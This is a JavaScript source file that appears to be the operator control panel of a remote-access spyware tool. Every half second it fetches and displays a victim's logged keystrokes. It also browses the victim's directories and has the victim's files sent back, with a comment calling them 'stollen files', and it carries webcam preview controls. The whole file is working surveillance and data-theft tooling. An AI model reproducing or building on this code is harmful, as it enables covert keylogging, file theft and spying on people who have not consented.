
const video_element = document.getElementById("webcam_preview");
const keybox = document.getElementById('keybox');
const dirbox = document.getElementById('dirbox');
const file_selector = document.getElementById('file_selector');
const downloadbox = document.getElementById('downloadbox');
const update_interval = 500;

document.getElementById('refresh_file').addEventListener('click', function () {
    request('/action/get/folders')
    request('/action/get/temp')
});

document.getElementById('back_a_dir').addEventListener('click', function () {//go back a directory button
    console.log('back_a_dir clicked');
    post(JSON.stringify({ action: 'go_back_a_dir' }), '/action/post/folders/instruct')//Post go back instruction to server

});
document.getElementById("stop_video").addEventListener('click', function () {//stop video feed button
    console.log('stop_video clicked');

});
document.getElementById("start_video").addEventListener('click', function () {//start video feed button
    console.log('start_video clicked');

});


window.addEventListener('load', function () {
    //request('/action/get/folders')//reequest folders when th page loads
    setInterval(() => {
        request('/action/get/folders')
        request('/action/get/keylog')//get th keylog repeatedly
    }, update_interval);
})

async function request(what) {//make a request to server

    try {
        var xhttp = new XMLHttpRequest();

        xhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {

                var resput = JSON.parse(this.responseText)//Resplnce is an object form the server

                //console.log('Sever responed with: ', resput)
                switch (what) {
                    case '/action/get/keylog'://keylog
                        writeoutkeylog(resput)
                        break;

                    case '/action/get/folders'://files and current dir
                        directoryman.files = resput.files;
                        directoryman.current_dir = resput.current_dir;
                        dirbox.innerHTML = ""
                        if (directoryman.current_dir[directoryman.current_dir.length - 1] == undefined) {
                            document.getElementById('full_path').innerText = 'root';
                        } else {
                            document.getElementById('full_path').innerText = directoryman.current_dir[directoryman.current_dir.length - 1];
                        }

                        for (let i in resput.files) {
                            directoryman.build_dir(resput.files[i].base, resput.files[i].type)
                        }
                        //resput.files.forEach(filee => { directoryman.build_dir(resput.path, resput.name, resput.type) })
                        break;

                    case '/action/get/temp'://prototype donload stollen files from server
                        console.log('Files: ', resput)
                        directoryman.build_downloads(resput)

                        break;
                }
                //return this.responseText;

            }
        };

        xhttp.open("GET", what, true);
        xhttp.send();
    } catch {
        console.warn('xhttp request failed');
    }

}

async function post(what, where) {//post data to server
    var xhttp = new XMLHttpRequest();

    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            var resput = JSON.parse(this.responseText)
            console.log('Sever responed to post ', where, 'with: ', resput)
            if (where == "/action/post/folders/instruct") {//posted an instruction
                /*for (let i = 0; i < 10; i++) {//0 imediatly
                    setTimeout(() => { request('/action/get/folders'); }, update_interval * i);
                }*/
            }
        }
    };

    xhttp.open("POST", where, true);
    xhttp.send(JSON.stringify(what));
}

function writeoutkeylog(keys) {//write keylog data to page
    //console.log('write keylog: ', keys)
    keybox.innerText = "";

    keys.forEach(keycode => {
        var keyholder = document.createElement('div');
        keyholder.className = "keyholder"
        keyholder.innerText = keycode;
        keybox.appendChild(keyholder)
    });
}

let directoryman = {
    files: [],
    current_dir: [],
    build_dir: function (base, type) {//represent a directory
        
        var directory = document.createElement('div');
        directory.className = "directory"
        var filename = document.createElement('div');
        filename.className = "filename"
        filename.innerText = base;
        var dir_icon = document.createElement('div');
        if (type == "folder") {//directory
            dir_icon.className = "dir_icon"
            directory.addEventListener('click', function () {
                if (directoryman.current_dir.length < 1) {
                    post(JSON.stringify({ action: 'search_dir', path: base }), '/action/post/folders/instruct')/*Post go back instruction to server*/
                } else {
                    post(JSON.stringify({
                        action: 'search_dir', path: directoryman.current_dir[directoryman.current_dir.length - 1] + '\\' + base
                    }), '/action/post/folders/instruct')/*Post go back instruction to server*/
                }

            })//search this directory
            directory.title = "search directory"
        } else {//file
            dir_icon.className = "file_icon"
            directory.title = "download file"
            directory.addEventListener('click', function () { //download file
                post(JSON.stringify({
                    action: 'download', path: directoryman.current_dir[directoryman.current_dir.length - 1] + '\\' + base
                }), '/action/post/folders/instruct')/*Post go back instruction to server*/
                setTimeout(() => { request('/action/get/temp') }, 2000)
                request('/action/get/temp')
            })
        }

        directory.appendChild(filename)
        directory.appendChild(dir_icon)
        dirbox.appendChild(directory)


    },
    build_downloads: function (paths) {
        downloadbox.innerHTML = ""
        paths.forEach((path) => {
            let link = document.createElement('a');
            link.innerText = path;
            link.title = "download" + path;
            link.href = 'temp/' + path
            link.setAttribute('download', '')
            downloadbox.appendChild(link)
        })
    },
    reset: function () {

    }
}